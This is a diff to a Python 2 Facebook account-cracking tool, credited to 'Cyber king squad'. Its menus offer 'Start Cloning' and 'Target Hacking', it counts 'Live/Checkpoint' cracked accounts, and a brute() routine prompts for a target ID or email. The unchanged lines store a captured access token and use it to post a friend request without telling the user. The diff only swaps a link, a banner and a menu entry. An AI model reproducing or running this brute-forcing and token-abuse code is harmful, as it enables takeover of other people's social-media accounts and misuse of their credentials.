@@ -810,7 +810,7 @@ def login1():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;95mLogin Successfully'
-				os.system('xdg-open https://www.youtube.com/channel/UCHetqAquUkojxVvPebQpb0g')
+				os.system('xdg-open https://www.facebook.com/106457414408853')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -866,8 +866,8 @@ def menu():
         print "033[1;97m==========================\033[1;97m"
         time.sleep(0.05)
 	print "1 .\x1b[1;94m\033[1;94mStart Cloning   "
-        time.sleep(0.05)
-        print "2 .\x1b[1;94m\033[1;94mStart Target Hacking        "
+       
+          
         time.sleep(0.05)
 	print "0 .\033[1;94m\033[1;94mLogout                         "
 	pilih()
@@ -1068,7 +1068,7 @@ def pilih_crack():
 	print "▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤"
 	print "  Written By Cyber king squad" #Dev:Rh king
 	print '\033[1;94mProcess Has Been Completed \033[1;94m....'
-        print '\033[1;92mType (python2 Dvl.py) New Fb Start Cloning\033[1;92m....'
+        print '\033[1;92m (cyber king squad) New Fb Start Cloning\033[1;92m....'
 	print"\033[1;96mTotal Live/\x1b[1;96mCheckpoint \033[1;96m: \033[1;96m"+str(len(oks))+"\033[1;96m/\033[1;96m"+str(len(cekpoint))
 	print """
 
@@ -1101,7 +1101,7 @@ def brute():
         login()
     else:
         os.system('clear')
-        print logo14
+        print logo25
         print '-----------------------------------------------------------'
         try:
             email = raw_input('\x1b[1;96mID\x1b[1;95m/\x1b[1;95mEmail \x1b[1;95mTarget \x1b[1;95m:\x1b[1;95m ')
